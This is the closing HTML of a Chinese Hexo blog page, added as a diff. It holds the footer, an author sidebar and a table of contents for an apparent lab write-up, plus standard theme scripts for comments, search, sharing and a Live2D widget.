+                Five86-1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/log-img2.svg" alt="荼雨">
+            
+              <p class="site-author-name" itemprop="name">荼雨</p>
+              <p class="site-description motion-element" itemprop="description">Welcome 荼雨's Blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/evilH2O2" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/ce336ffc43fd" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:Su1eZ@pm.me" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#枚举"><span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆"><span class="nav-text">登陆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集-1"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹-shell"><span class="nav-text">反弹 shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-text">提权</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">荼雨</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a></div>
+
+
+
+
+
+  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize("");
+    }
+  </script>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: false,
+        appId: 'krsL2ix7mdkWBBwQYmbusGzr-MdYXbMMI',
+        appKey: 'OvSNXUhDDj0YhGLNmasoexFT',
+        placeholder: '(≧∇≦)ﾉ哦呀~这位客官~不来聊一下江湖的大~事嘛~',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":true,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"right","width":180,"height":500},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script>
+</body>
+</html>
